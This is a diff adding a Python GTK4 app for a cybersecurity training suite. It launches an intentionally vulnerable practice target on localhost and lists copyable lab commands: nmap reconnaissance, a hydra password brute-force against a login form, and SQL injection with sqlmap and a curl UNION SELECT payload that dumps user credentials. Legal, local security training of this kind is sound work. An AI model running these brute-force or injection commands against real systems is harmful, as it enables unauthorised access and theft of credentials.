@@ -1,0 +1,153 @@
+#!/usr/bin/env python3
+# AETHER Guided Labs — start a safe, local practice target and walk through the
+# shipped tools against it. The target (aether-lab-target) is intentionally
+# vulnerable but bound to 127.0.0.1 only and seeded with fake data, so you learn
+# the real tools on a target you own, legally. (GTK4 + libadwaita)
+import gi, os, socket, subprocess, signal
+gi.require_version("Gtk","4.0"); gi.require_version("Adw","1")
+from gi.repository import Gtk, Adw, Gio, Gdk, GLib
+
+HOST, PORT = "127.0.0.1", 8080
+PIDFILE = os.path.join(os.environ.get("XDG_CACHE_HOME", os.path.expanduser("~/.cache")),
+                       "aether", "lab-target.pid")
+
+LABS = [
+  {"title": "1 · Recon — find the service",
+   "obj": "Every test starts with recon. Discover the open port and what software answers on it.",
+   "cmds": ["nmap -sV -p 8080 127.0.0.1"],
+   "win": "8080/tcp shows open, Server 'AetherPractice'. You've mapped the target."},
+  {"title": "2 · Weak credentials — break the login",
+   "obj": "The /login form accepts a weak password. Build a small wordlist and let hydra try them.",
+   "cmds": ["printf 'password\\nletmein\\nadmin123\\n' > words.txt",
+            "hydra -l admin -P words.txt 127.0.0.1 -s 8080 http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\""],
+   "win": "hydra reports login: admin  password: admin123. Weak passwords fall in seconds."},
+  {"title": "3 · SQL injection — dump the secrets",
+   "obj": "The /item?id= parameter drops your input straight into a SQL query. Extract the hidden users table.",
+   "cmds": ["sqlmap -u \"http://127.0.0.1:8080/item?id=1\" --batch --dump -T users",
+            "curl \"http://127.0.0.1:8080/item?id=0 UNION SELECT username,password,secret FROM users\""],
+   "win": "You recover usernames, passwords, and the FLAG{...} secrets. That's why you use prepared statements."},
+]
+
+CSS="""
+window { background: rgba(14,17,22,0.93); border-radius: 18px; }
+.lb-root { padding: 16px; }
+.lb-title { font-weight:800; font-size:18px; color:#E6EAF0; }
+.lb-note { color:#D29922; font-size:12px; }
+.status { border-radius:13px; padding:10px 14px; border:1px solid rgba(255,255,255,0.07); }
+.status.on  { background: rgba(53,208,186,0.14); }
+.status.off { background: rgba(255,255,255,0.06); }
+.st-dot-on  { color:#35D0BA; font-weight:800; }
+.st-dot-off { color:#9AA4B2; font-weight:800; }
+.st-txt { color:#E6EAF0; font-size:13px; font-weight:600; }
+.st-sub { color:#9AA4B2; font-size:11px; }
+.go { background:#35D0BA; color:#0E1116; border-radius:10px; padding:6px 16px; font-weight:800; min-height:0; }
+.stop { background: rgba(248,81,73,0.22); color:#E6EAF0; border-radius:10px; padding:6px 16px; font-weight:800; min-height:0; }
+.lab { background: rgba(255,255,255,0.06); border-radius:15px; padding:14px; border:1px solid rgba(255,255,255,0.07); }
+.l-title { color:#E6EAF0; font-size:15px; font-weight:800; }
+.l-obj { color:#C7CED8; font-size:13px; }
+.l-cmd { background: rgba(0,0,0,0.45); border-radius:10px; padding:8px 11px; color:#35D0BA;
+         font-family:'JetBrains Mono',monospace; font-size:12px; }
+.l-win { color:#35D0BA; font-size:12px; }
+.l-label { color:#9AA4B2; font-size:10px; font-weight:800; letter-spacing:0.6px; }
+.copy { background: rgba(53,208,186,0.20); color:#E6EAF0; border-radius:9px; padding:3px 11px;
+        font-weight:700; font-size:11px; min-height:0; }
+.copy:hover { background: rgba(53,208,186,0.38); }
+"""
+
+def is_up():
+    s=socket.socket(); s.settimeout(0.3)
+    try: s.connect((HOST, PORT)); return True
+    except Exception: return False
+    finally: s.close()
+
+class Labs(Adw.Application):
+    def __init__(s):
+        super().__init__(application_id="com.aether.labs",
+                         flags=Gio.ApplicationFlags.NON_UNIQUE)
+
+    def _start_target(s):
+        if is_up(): return
+        os.makedirs(os.path.dirname(PIDFILE), exist_ok=True)
+        p=subprocess.Popen(["aether-lab-target"], start_new_session=True,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        try: open(PIDFILE,"w").write(str(p.pid))
+        except Exception: pass
+
+    def _stop_target(s):
+        try:
+            pid=int(open(PIDFILE).read().strip()); os.kill(pid, signal.SIGTERM)
+        except Exception: pass
+        try: os.remove(PIDFILE)
+        except Exception: pass
+
+    def do_activate(s):
+        p=Gtk.CssProvider(); p.load_from_data(CSS.encode())
+        Gtk.StyleContext.add_provider_for_display(Gdk.Display.get_default(),p,Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)
+        w=Adw.ApplicationWindow(application=s, title="Guided Labs",
+                                default_width=560, default_height=680)
+        w.set_resizable(False); s.win=w
+        root=Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=10); root.add_css_class("lb-root")
+        root.append(Gtk.Label(label="Guided Security Labs", xalign=0, css_classes=["lb-title"]))
+        root.append(Gtk.Label(label="Safe, local, legal. The target is intentionally vulnerable but only on 127.0.0.1. These techniques are illegal against systems you don't own.",
+                              xalign=0, wrap=True, css_classes=["lb-note"]))
+        s.status=Gtk.Box(spacing=10); s.status.add_css_class("status")
+        s.dot=Gtk.Label(); s.sttxt=Gtk.Box(orientation=Gtk.Orientation.VERTICAL, hexpand=True)
+        s.stline=Gtk.Label(xalign=0, css_classes=["st-txt"]); s.stsub=Gtk.Label(xalign=0, css_classes=["st-sub"])
+        s.sttxt.append(s.stline); s.sttxt.append(s.stsub)
+        s.btn=Gtk.Button(); s.btn.set_valign(Gtk.Align.CENTER); s.btn.connect("clicked", s._toggle)
+        s.status.append(s.dot); s.status.append(s.sttxt); s.status.append(s.btn)
+        root.append(s.status)
+        sc=Gtk.ScrolledWindow(vexpand=True); sc.set_policy(Gtk.PolicyType.NEVER, Gtk.PolicyType.AUTOMATIC)
+        box=Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
+        for lab in LABS: box.append(s._lab(lab))
+        sc.set_child(box); root.append(sc)
+        w.set_content(root)
+        k=Gtk.EventControllerKey()
+        k.connect("key-pressed", lambda c,kv,kc,st:(s.quit() or True) if kv==Gdk.KEY_Escape else False)
+        w.add_controller(k)
+        s._refresh(); w.present()
+
+    def _toggle(s,_):
+        if is_up(): s._stop_target()
+        else: s._start_target()
+        GLib.timeout_add(600, s._refresh)
+
+    def _refresh(s, *a):
+        up=is_up()
+        for c in ("on","off"): s.status.remove_css_class(c)
+        s.status.add_css_class("on" if up else "off")
+        s.dot.set_text("●"); s.dot.add_css_class("st-dot-on" if up else "st-dot-off")
+        s.dot.remove_css_class("st-dot-off" if up else "st-dot-on")
+        s.stline.set_text("Practice target is RUNNING" if up else "Practice target is stopped")
+        s.stsub.set_text("http://127.0.0.1:8080  ·  intentionally vulnerable, localhost only" if up
+                         else "Start it, then run the labs below against it")
+        s.btn.set_label("Stop" if up else "Start target")
+        for cls in ("go","stop"): s.btn.remove_css_class(cls)
+        s.btn.add_css_class("stop" if up else "go")
+        return False
+
+    def _lab(s, lab):
+        c=Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=7); c.add_css_class("lab")
+        c.append(Gtk.Label(label=lab["title"], xalign=0, wrap=True, css_classes=["l-title"]))
+        c.append(Gtk.Label(label=lab["obj"], xalign=0, wrap=True, css_classes=["l-obj"]))
+        c.append(Gtk.Label(label="COMMANDS", xalign=0, css_classes=["l-label"]))
+        for cmd in lab["cmds"]:
+            row=Gtk.Box(spacing=8)
+            l=Gtk.Label(label=cmd, xalign=0, wrap=True, selectable=True, hexpand=True, css_classes=["l-cmd"])
+            l.set_xalign(0); row.append(l)
+            b=Gtk.Button(label="Copy"); b.add_css_class("copy"); b.set_valign(Gtk.Align.START)
+            b.connect("clicked", lambda _,t=cmd,btn=None,bb=None: s._copy(t))
+            row.append(b); c.append(row)
+        c.append(Gtk.Label(label="SUCCESS", xalign=0, css_classes=["l-label"]))
+        c.append(Gtk.Label(label=lab["win"], xalign=0, wrap=True, css_classes=["l-win"]))
+        return c
+
+    def _copy(s, text):
+        if __import__("shutil").which("wl-copy"):
+            try: subprocess.run(["wl-copy", text], timeout=2)
+            except Exception: pass
+        else:
+            Gdk.Display.get_default().get_clipboard().set(text)
+
+if __name__=="__main__":
+    Adw.init(); Labs().run(None)
